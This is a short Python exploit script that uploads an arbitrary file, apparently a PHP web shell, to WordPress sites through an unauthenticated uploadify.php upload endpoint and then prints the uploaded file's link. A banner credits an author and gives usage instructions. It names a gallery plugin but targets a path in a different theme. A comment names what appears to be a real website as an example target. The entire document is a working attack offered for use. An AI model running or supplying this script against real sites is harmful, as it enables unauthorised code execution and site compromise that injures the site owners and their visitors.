#!/usr/bin/python
import requests
import sys
import time

banner = '''
|----------------------------------------------------------------------
| Wordpress "Complete Gallery Manager 3.3.3" Plugin File Upload Vulnerability
| Coded By: Muhammad Shahzad                         
| 
| 
| Usage: python gallery-manager.py sitelist.txt filname.php
|----------------------------------------------------------------------
'''
print "\n\n"
print banner

url = sys.argv[1] #http://sonikraf.com/
b = "%s/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php" %url
filename = sys.argv[2]
url2 = url + "/wp-content/themes/u-design/scripts/admin/uploadify/%s" %filename
file_data = open(filename, "rb")
fileo = {'Filedata':file_data}
headers = {'folder':'/wp-content/themes/u-design/scripts/admin/uploadify/'}
r = requests.post(b, files=fileo, headers=headers)
status = r.status_code
if status == 200:
	print "\n\n[+]Successfully eXploited!"
	time.sleep(2)
	print "[+]File Link: %s" % url2
else:
	print "\n\n[+]Failed."
	time.sleep(2)